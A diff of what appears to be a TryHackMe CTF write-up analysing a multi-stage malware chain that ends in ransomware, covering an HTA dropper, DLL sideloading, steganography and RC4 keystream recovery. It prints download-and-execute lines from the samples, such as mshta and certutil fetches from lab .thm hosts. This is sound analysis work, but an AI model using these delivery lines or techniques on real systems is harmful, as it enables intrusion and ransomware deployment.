@@ -1,15 +1,16 @@
 ---
-title: "Love at First Breach 2026 - TryHackMe - Task 1: LOVELETTER.exe"
+title: "Love at First Breach 2026 - Advanced Track - TryHackMe - Task 1: LOVELETTER.exe"
 date: 2026-02-17 17:00:00 +0100
 categories: [CTF, TryHackMe]
-tags: [forensics, malware-analysis, reverse-engineering, powershell, vbscript, ransomware]
+tags: [forensics, malware-analysis, reverse-engineering, reversing, powershell, vbscript, ransomware]
 image:
-  path: ../../../../assets/img/Love at the first breach.png
+  path: ../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Love at the first breach.png
   alt: Challenge Banner
 author: kairos
+math: true
 ---
 
-![Banner](../../../../assets/img/Pasted%20image%2020260216193729.png)
+![Banner](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216193729.png)
 
 This Valentine's Day, an employee at Cupid Corp received a heartfelt e-card from a secret admirer, but romance wasn't the only thing in the air. Initial findings reveal that multiple attacker-controlled domains are tied to the campaign, each serving a distinct role in a highly sophisticated, multi-stage payload delivery chain.
 
@@ -21,8 +22,8 @@ To get started, investigate the email in this [archive](https://lafb-files.s3.eu
 
 Zip password: **happyvalentines**
 
-![Archive](../../../../assets/img/Pasted%20image%2020260216194528.png)
-![Extraction](../../../../assets/img/Pasted%20image%2020260216194741.png)
+![Archive](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216194528.png)
+![Extraction](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216194741.png)
 
 ## Phase 1: Initial Investigation (The Phishing Email)
 We begin by extracting the email `valentine_ecard.eml`. In forensic investigations, it is **critical** to never open suspicious emails in a standard mail client initially, as they might trigger zero-click exploits or load tracking pixels. Instead, we inspect the raw text for Indicators of Compromise (IOCs), specifically URLs.
@@ -34,9 +35,9 @@ grep -oP 'http[s]?://[^"]+' valentine_ecard.eml
 ```
 
 
-![Grep URL](../../../../assets/img/Pasted%20image%2020260216195724.png)
-![Term 1](../../../../assets/img/Pasted%20image%2020260216195230.png)
-![Term 2](../../../../assets/img/Pasted%20image%2020260216195400.png)
+![Grep URL](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216195724.png)
+![Term 1](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216195230.png)
+![Term 2](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216195400.png)
 
 The grep results point us to `http://ecard.rosesforyou.thm/love.hta`.
 
@@ -52,7 +53,7 @@ about:config
 general.useragent.override
 ```
 
-![about:config](../../../../assets/img/Pasted%20image%2020260216200007.png)
+![about:config](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216200007.png)
 
 We set the User-Agent to a standard Windows 10 string to mimic a legitimate target:
 
@@ -60,11 +61,11 @@ We set the User-Agent to a standard Windows 10 string to mimic a legitimate targ
 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
 ```
 
-![User Agent](../../../../assets/img/Pasted%20image%2020260216200157.png)
-![Downloads](../../../../assets/img/Pasted%20image%2020260216200227.png)
-![File Save](../../../../assets/img/Pasted%20image%2020260216200251.png)
-![File System](../../../../assets/img/Pasted%20image%2020260216201001.png)
-![HTA icon](../../../../assets/img/Pasted%20image%2020260216201249.png)
+![User Agent](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216200157.png)
+![Downloads](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216200227.png)
+![File Save](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216200251.png)
+![File System](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216201001.png)
+![HTA icon](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216201249.png)
 
 After spoofing the User-Agent, the server accepts our request and provides the malicious attachment: `love.hta`.
 
@@ -75,7 +76,7 @@ An **HTA (HTML Application)** file is essentially a web page that runs with the 
 
 Right-clicking and viewing properties usually gives us basic info, but we need to see the code.
 
-![Properties](../../../../assets/img/Pasted%20image%2020260216202710.png)
+![Properties](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216202710.png)
 
 ```powershell
 Local Base Path                 : C:\Windows\System32\cmd.exe
@@ -84,13 +85,13 @@ Description                     : Valentine's Day Love Letter
 Command Line Arguments          : /V /C "... set x=ms^ht^a&&set y=http://ecard.rosesforyou.thm/love.hta&&call %x% %y%"
 ```
 
-![Analysis](../../../../assets/img/Pasted%20image%2020260216202015.png)
-![Process](../../../../assets/img/Pasted%20image%2020260216202517.png)
+![Analysis](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216202015.png)
+![Process](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216202517.png)
 
 Opening the file in a text editor reveals **VBScript** code heavily obfuscated using `Chr()` calls. Obfuscation aims to hide strings like URLs or command names from antivirus signatures.
 
-![Obfuscated Code](../../../../assets/img/Pasted%20image%2020260216202628.png)
-![Code View](../../../../assets/img/Pasted%20image%2020260216203240.png)
+![Obfuscated Code](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216202628.png)
+![Code View](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216203240.png)
 
 ```html
 <html>
@@ -108,7 +109,7 @@ Opening the file in a text editor reveals **VBScript** code heavily obfuscated u
 </html>
 ```
 
-![HTA Source](../../../../assets/img/Pasted%20image%2020260216204328.png)
+![HTA Source](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216204328.png)
 
 ### Deobfuscation
 Instead of manually translating ASCII codes, we write a Python script to automate the process. This script finds `Chr(number)` patterns and replaces them with their actual characters.
@@ -137,7 +138,7 @@ def deobfuscate_file(filepath):
     # ...
 ```
 
-![Python Script](../../../../assets/img/Pasted%20image%2020260216204711.png)
+![Python Script](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216204711.png)
 
 Running the deobfuscator reveals the cleartext script:
 
@@ -165,8 +166,8 @@ Running the deobfuscator reveals the cleartext script:
 </html>
 ```
 
-![Deobfuscated Result](../../../../assets/img/Pasted%20image%2020260216205011.png)
-![Visual Code](../../../../assets/img/Pasted%20image%2020260216205236.png)
+![Deobfuscated Result](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216205011.png)
+![Visual Code](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216205236.png)
 
 ### The DLL Sideloading Attack
 The logic here is very specific and indicates a **DLL Sideloading** attack.
@@ -185,24 +186,24 @@ c = "certutil -urlcache -split -f "
 x = c & u & "bthprops.cpl " & p & "\bthprops.cpl"
 ```
 
-![Logic Flow](../../../../assets/img/Pasted%20image%2020260216205442.png)
-![Downloads](../../../../assets/img/Pasted%20image%2020260216211636.png)
-![Files](../../../../assets/img/Pasted%20image%2020260216211839.png)
-![Executables](../../../../assets/img/Pasted%20image%2020260216212020.png)
-![More files](../../../../assets/img/Pasted%20image%2020260216212250.png)
-![Analysis](../../../../assets/img/Pasted%20image%2020260216212555.png)
-![Analysis 2](../../../../assets/img/Pasted%20image%2020260216212634.png)
-![Analysis 3](../../../../assets/img/Pasted%20image%2020260216212707.png)
-![Analysis 4](../../../../assets/img/Pasted%20image%2020260216212728.png)
-![Analysis 5](../../../../assets/img/Pasted%20image%2020260216212759.png)
+![Logic Flow](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216205442.png)
+![Downloads](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216211636.png)
+![Files](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216211839.png)
+![Executables](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216212020.png)
+![More files](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216212250.png)
+![Analysis](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216212555.png)
+![Analysis 2](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216212634.png)
+![Analysis 3](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216212707.png)
+![Analysis 4](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216212728.png)
+![Analysis 5](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216212759.png)
 
 ---
 
 ## Phase 3: Reverse Engineering the DLL
 We execute the malware's plan in a controlled environment or statically analyze `bthprops.cpl` (the malicious DLL). We open it in **Ghidra**.
 
-![Ghidra DllMain](../../../../assets/img/Pasted%20image%2020260216220942.png)
-![Ghidra Listing](../../../../assets/img/Pasted%20image%2020260216221050.png)
+![Ghidra DllMain](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216220942.png)
+![Ghidra Listing](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216221050.png)
 
 We look at `DllMain`, the entry point for DLLs.
 
@@ -219,7 +220,7 @@ undefined8 DllMain(HMODULE param_1,uint param_2)
 
 When the process attaches (`param_2 == 1`), it calls `_p()`. This confirms the malicious behavior starts immediately upon load.
 
-![Function _p](../../../../assets/img/Pasted%20image%2020260216221340.png)
+![Function _p](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216221340.png)
 
 Inside `_p()`, we see a stack-string construction technique. The malware builds a command string character by character (or chunk by chunk) to avoid static string analysis. It also calls `_d()`, which appears to be a decryption function.
 
@@ -235,7 +236,7 @@ void _p(void)
 }
 ```
 
-![Decompilation](../../../../assets/img/Pasted%20image%2020260216222714.png)
+![Decompilation](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216222714.png)
 
 Analyzing `_d`, we can reconstruct the custom encryption algorithm.
 
@@ -259,11 +260,11 @@ $$DecryptedByte[i] = (i \times 0x29) \oplus EncryptedByte[i] \oplus 0x4C$$
 
 This is a simple symmetric obscured algorithm. The malware author likely wrote this to prevent simple `strings` commands from revealing the C2 URL.
 
-![Hex Dump 1](../../../../assets/img/Pasted%20image%2020260216223546.png)
-![Hex Dump 2](../../../../assets/img/Pasted%20image%2020260216223622.png)
-![Review](../../../../assets/img/Pasted%20image%2020260216223835.png)
-![Review 2](../../../../assets/img/Pasted%20image%2020260216224108.png)
-![Review 3](../../../../assets/img/Pasted%20image%2020260216224312.png)
+![Hex Dump 1](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216223546.png)
+![Hex Dump 2](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216223622.png)
+![Review](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216223835.png)
+![Review 2](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216224108.png)
+![Review 3](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216224312.png)
 
 We write a Python script to emulate this function and decrypt the hardcoded bytes.
 
@@ -293,19 +294,19 @@ if __name__ == "__main__":
     decrypt_url()
 ```
 
-![Decryption Run](../../../../assets/img/Pasted%20image%2020260216224614.png)
+![Decryption Run](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216224614.png)
 
 The decrypted URL is `http://cdn.loveletters.thm/roses.jpg`.
 
-![URL result](../../../../assets/img/Pasted%20image%2020260216224458.png)
+![URL result](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216224458.png)
 
 ---
 
 ## Phase 4: PowerShell and Steganography
 The DLL constructs and executes a PowerShell command. This command is responsible for fetching the next stage.
 
-![PowerShell Script](../../../../assets/img/Pasted%20image%2020260216224711.png)
-![Script Analysis](../../../../assets/img/Pasted%20image%2020260216224739.png)
+![PowerShell Script](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216224711.png)
+![Script Analysis](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216224739.png)
 
 The script downloads the image `roses.jpg`. Images are excellent carriers for malware (Steganography) because they are often allowed through firewalls where `.exe` or `.ps1` files would be blocked.
 
@@ -321,7 +322,7 @@ $c3 = [byte[]](0x52,0x4F,0x53,0x45,0x53) # Key: ROSES
 ```
 
 It’s a matter of translating bytes into human-readable language.
-![bytes_to_human](../../../../assets/img/Screenshot_4.png)
+![bytes_to_human](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Screenshot_4.png)
 
 **Logic:**
 1.  Download the JPG.
@@ -338,8 +339,8 @@ It’s a matter of translating bytes into human-readable language.
 | **Key**      | `ROSES`                                          |
 | `$h2`        | `CUPID`                                          |
 
-![Trace](../../../../assets/img/Pasted%20image%2020260216225148.png)
-![More Trace](../../../../assets/img/Pasted%20image%2020260216225414.png)
+![Trace](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216225148.png)
+![More Trace](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216225414.png)
 
 We can extract the payload manually using Python to verify what comes next.
 
@@ -365,8 +366,8 @@ else:
     # ... Decode Base64 and print
 ```
 
-![Stego Script](../../../../assets/img/Pasted%20image%2020260216225802.png)
-![Stego Result](../../../../assets/img/Pasted%20image%2020260216225910.png)
+![Stego Script](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216225802.png)
+![Stego Result](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216225910.png)
 
 {% raw %}
 ```shell
@@ -389,17 +390,17 @@ ws.Run "cmd /c start "" "" & dp & """, 0, False
 
 The extracted payload is, yet again, a VBScript. This multi-stage approach (HTA -> DLL -> PS1 -> Stego -> VBS) is designed to exhaust the defenders and automated sandboxes. This final script downloads the actual binary: `heartbeat.exe`.
 
-![Decrypted Code](../../../../assets/img/Pasted%20image%2020260216230332.png)
-![Execution](../../../../assets/img/Pasted%20image%2020260216230813.png)
-![Ransomware](../../../../assets/img/Pasted%20image%2020260216232615.png)
+![Decrypted Code](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216230332.png)
+![Execution](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216230813.png)
+![Ransomware](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216232615.png)
 
 ---
 
 ## Phase 5: HeartBeat Ransomware Analysis
 The final payload `heartbeat.exe` executes and encrypts files. This confirms it is a **Ransomware** attack.
 
-![Binary](../../../../assets/img/Pasted%20image%2020260216231757.png)
-![Encryption](../../../../assets/img/Pasted%20image%2020260216232922.png)
+![Binary](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216231757.png)
+![Encryption](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216232922.png)
 
 We examine the ransom note left behind. It contains all the configuration details we need to understand the C2 communication.
 
@@ -416,9 +417,9 @@ We examine the ransom note left behind. It contains all the configuration detail
 | Authorization     | `Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==` | base64 for `cupid_agent:R0s3s4r3R3d!V10l3ts4r3Blu3#2024`      |
 
 
-![Ransom Note](../../../../assets/img/Pasted%20image%2020260216233533.png)
-![Note Details](../../../../assets/img/Pasted%20image%2020260216234356.png)
-![File structure](../../../../assets/img/Pasted%20image%2020260216234829.png)
+![Ransom Note](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216233533.png)
+![Note Details](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216234356.png)
+![File structure](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216234829.png)
 
 ---
 
@@ -427,14 +428,14 @@ To recover the files without paying, we need to find a weakness in the encryptio
 
 We can search for the exfiltration function in the binary or scan the active C2 server.
 
-![Exfil search](../../../../assets/img/Pasted%20image%2020260216235454.png)
-![Exfil func](../../../../assets/img/Pasted%20image%2020260216235637.png)
+![Exfil search](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216235454.png)
+![Exfil func](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216235637.png)
 
 Scanning the server with `nmap`:
 
-![Nmap](../../../../assets/img/Pasted%20image%2020260216235704.png)
-![Port Scan](../../../../assets/img/Pasted%20image%2020260217000011.png)
-![Service Info](../../../../assets/img/Pasted%20image%2020260217000103.png)
+![Nmap](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216235704.png)
+![Port Scan](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260217000011.png)
+![Service Info](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260217000103.png)
 
 Connecting to the port gives us a JSON status:
 
@@ -444,10 +445,10 @@ HTTP/1.1 200 OK
 {"cipher":"rc4","service":"valentine-exfil","status":"alive","version":"2.0.24"}
 ```
 
-![Response](../../../../assets/img/Pasted%20image%2020260216235854.png)
-![Json](../../../../assets/img/Pasted%20image%2020260217000630.png)
-![Details](../../../../assets/img/Pasted%20image%2020260217000350.png)
-![More details](../../../../assets/img/Pasted%20image%2020260217000954.png)
+![Response](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260216235854.png)
+![Json](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260217000630.png)
+![Details](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260217000350.png)
+![More details](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260217000954.png)
 
 The server explicitly states: `"cipher":"rc4"`.
 
@@ -461,13 +462,16 @@ A fundamental rule of stream ciphers is: **Never use the same Key/Nonce for diff
 Since the server handles the encryption (Exfiltration as a Service), and it likely uses a static key or generates the keystream server-side based on the session:
 
 If we send a file consisting entirely of **Null Bytes** (0x00) to be encrypted:
+
 $$ P = 0 $$
+
 $$ C = 0 \oplus K_{stream} $$
+
 $$ C = K_{stream} $$
 
 The resulting "encrypted" file will be the **raw keystream**.
 
-![Crypto Logic](../../../../assets/img/Pasted%20image%2020260217001245.png)
+![Crypto Logic](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260217001245.png)
 
 ### Exploitation
 We need to send a file to the `/exfil` endpoint that the server will encrypt. Since we want to recover the keystream, we should send **Null Bytes**.
@@ -511,7 +515,7 @@ python3 -c "k=open('keystream.bin','rb').read(); f=open('flag.enc','rb').read();
 THM{l0v3_l3tt3r_fr0m_th3_90s_xoxo}
 ```
 
-![Flag](../../../../assets/img/Pasted%20image%2020260217001629.png)
+![Flag](../../../../../assets/img/THM/LoveAtFirstBreach/Loveletter_exe/Pasted%20image%2020260217001629.png)
 
 # References
 - [CreateProcessA](https://learn.microsoft.com/es-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
